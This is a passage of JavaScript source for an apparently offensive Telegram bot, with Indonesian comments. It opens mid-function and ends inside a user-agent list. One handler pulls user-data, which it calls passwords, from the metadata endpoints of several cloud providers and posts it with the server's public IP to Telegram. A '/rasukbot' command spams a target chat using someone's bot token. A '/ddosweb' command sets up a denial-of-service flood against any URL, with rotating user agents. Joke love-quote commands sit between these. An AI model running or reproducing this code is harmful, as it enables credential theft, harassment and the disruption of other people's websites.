            if (!res.ok) return null;
            return await res.text();
        } catch {
            return null;
        } finally {
            clearTimeout(t);
        }
    };

    let provider = 'Unknown';
    let userData = null;

    // --- LOGIKA PENCARIAN PASSWORD (USERDATA) ---

    // 1. DigitalOcean
    const doMeta = await tryFetch('http://169.254.169.254/metadata/v1.json', { Accept: 'application/json' });
    if (doMeta) {
        provider = 'DigitalOcean';
        try { userData = JSON.parse(doMeta).user_data ?? null; } catch {}
    }

    // 2. AWS
    if (!userData) {
        const aws = await tryFetch('http://169.254.169.254/latest/user-data');
        if (aws) { provider = 'AWS'; userData = aws; }
    }

    // 3. GCP
    if (!userData) {
        const gcp = await tryFetch(
            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data',
            { 'Metadata-Flavor': 'Google' }
        );
        if (gcp) { provider = 'GCP'; userData = gcp; }
    }

    // 4. Linode
    if (!userData) {
        const linode = await tryFetch('http://169.254.169.254/metadata/v1/user-data');
        if (linode) { provider = 'Linode'; userData = linode; }
    }

    // 5. Vultr
    if (!userData) {
        const vultr = await tryFetch('http://169.254.169.254/v1/user-data');
        if (vultr) { provider = 'Vultr'; userData = vultr; }
    }

    // 6. IPv4 Publik (Cek IP)
    let ip = 'N/A';
    try {
        const r = await fetch('https://ifconfig.me/ip');
        if (r.ok) ip = (await r.text()).trim();
    } catch {}

    // --- OUTPUT HASIL KE TELEGRAM ---
    let teksHasil = `<b>🚀 VPS INFO REPORT (WORK 100%)</b>\n`;
    teksHasil += `━━━━━━━━━━━━━━━━━━━━\n`;
    teksHasil += `<b>📍 Provider  :</b> <code>${provider}</code>\n`;
    teksHasil += `<b>🌐 Public IP :</b> <code>${ip}</code>\n`;
    teksHasil += `━━━━━━━━━━━━━━━━━━━━\n`;
    teksHasil += `<b>🔑 PASSWORD / USERDATA :</b>\n\n`;
    
    if (userData) {
        teksHasil += `<pre>${userData}</pre>`;
    } else {
        teksHasil += `<i>(Empty: Password tidak disimpan di Metadata Server ini)</i>`;
    }

    await ctx.reply(teksHasil, { parse_mode: 'HTML' });
});
    
bot.command("rasukbot", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const input = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  // Jika hanya /rasukbot
  if (!input) {
    return ctx.replyWithHTML(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>"
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // MODE REPLY
    if (reply) {
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 3) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|pesan|jumlah</code> (reply pesan target)"
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // MODE MANUAL
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 4) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
        );
      }

      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.replyWithHTML(
        "❌ Format tidak valid!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 0; i < jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.replyWithHTML(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`
    );

  } catch (err) {
    await ctx.replyWithHTML(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`
    );
  }
});
bot.command("cekid", async (ctx) => {
const userId = ctx.from.id;

let teks = `𝗜𝗗 𝗟𝗨 𝗡𝗜 -> ${userId}`;

ctx.sendMessage(userId, teks);

});
  const quotes = [
    "Aku rela jadi yang kedua, asal kamu bahagia.",
    "Kamu tahu nggak? Kamu itu alasanku buka mata tiap pagi.",
    "Kalau cinta butuh pengorbanan, aku rela disakiti.",
    "Aku bukan yang terbaik, tapi aku akan berusaha jadi yang paling setia.",
    "Sayang, jangan pergi. Aku belum selesai mencintaimu.",
    "Kamu adalah alasan aku selalu tersenyum tiap hari.",
    "Cintaku kayak utang negara, nggak akan lunas sampai kapanpun.",
    "Kalau kamu bahagia sama dia, aku rela mundur walau hati hancur.",
    "Kalau cinta itu bodoh, maka aku bangga jadi yang paling bodoh.",
    "Cinta sejati itu bukan yang datang pertama, tapi yang bertahan sampai akhir.",
    "Setiap detik tanpamu itu siksaan.",
    "Aku ingin jadi alasan kamu bahagia, bukan alasan kamu terluka.",
    "Aku bucin karena kamu, bukan karena siapa-siapa.",
    "Kalau sayang bilang, jangan disimpan dalam diam.",
    "Jangan lelah mencintaiku, aku sedang belajar memperbaiki diri untukmu."
  ];
  bot.command("bucin", (ctx) => {
    const random = quotes[Math.floor(Math.random() * quotes.length)];
    ctx.reply(`💘 ${random}`);
  });

  const teks = [
    "Kadang, yang setia malah disia-siakan.",
    "Aku tersenyum, padahal hatiku hancur.",
    "Cinta tak selamanya indah, kadang menyakitkan.",
    "Aku rindu, tapi aku sadar aku bukan siapa-siapa.",
    "Jangan tanya kenapa aku diam, karena aku sudah lelah.",
    "Dulu kita dekat, sekarang hanya sisa kenangan.",
    "Aku mencintaimu, tapi kamu mencintainya.",
    "Kamu bahagia tanpaku, dan itu yang membuatku lebih sakit.",
    "Aku bertahan karena cinta, bukan karena tidak bisa pergi.",
    "Mereka bilang sabar, tapi hatiku sudah berdarah-darah.",
    "Terkadang, aku berharap tak pernah mengenalmu.",
    "Aku takut jatuh cinta lagi, karena sakitnya belum sembuh.",
    "Kamu ajari aku bahagia, lalu kamu pergi tinggalkan luka.",
    "Katanya cinta itu indah, kenapa aku selalu terluka?",
    "Aku sudah cukup kuat... sampai kamu datang lagi dengan luka baru."
  ];
  bot.command("sadboy", (ctx) => {
    ctx.reply(`😢 ${teks[Math.floor(Math.random() * teks.length)]}`);
  });

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
];

const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

bot.command("ddosweb", async (ctx) => {
    try {
    

        const argsText = ctx.message.text.split(" ").slice(1).join(" ").trim();
        if (!argsText) {
            return ctx.reply("🪧 ☇ Format: /ddosweb https://target.com 1000");
        }

        const [target_url, rawThreads] = argsText.split(" ");
        const threads = parseInt(rawThreads) || 50;

        // Pesan Awal (HTML style sesuai permintaan)
        const processMsg = await ctx.reply(`<blockquote><strong>
⬡═―—⊱ ⎧ 『 Vïðñïx Inv¡cťús 』⊰―—═⬡
✧ - Target
☇ - ${target_url}
✧ - Threads
☇ - ${threads}
✧ - Status
☇ - Process
</strong></blockquote>`, { parse_mode: "HTML" });

        const attackConfig = {
            threads: threads,
            duration: 60000,
            requestsPerThread: 1000,
            userAgents: [
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (iPad; CPU OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/231.0.475926209 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.36 Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148  CSDNApp/5.11.1(iOS)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/236.0.484392333 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.92 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.78 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/106.1  Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)  Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.42 Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/180.0.400278405 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [LinkedInApp]/9.25.434',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; A20S PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Safari/537.36 OPR/72.3.3767.68685',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; YAL-L21; HMSCore 6.8.0.312; GMSCore 22.44.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 2201117TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BE2029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BL8800Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; IN2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g(9) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1992) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SHARK PRS-H0 Build/PROS2203060OS00MP5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/387.0.0.22.106;]',
    'Mozilla/5.0 (Linux; Android 11; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A207M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; TECNO BD2d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168',
    'Mozilla/5.0 (Linux; Android 12; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 22041211AC Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; A063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; DN2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; I2012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; KB2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LE2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LGE-AN00; HMSCore 6.8.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.4.302 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J20CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g(60)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
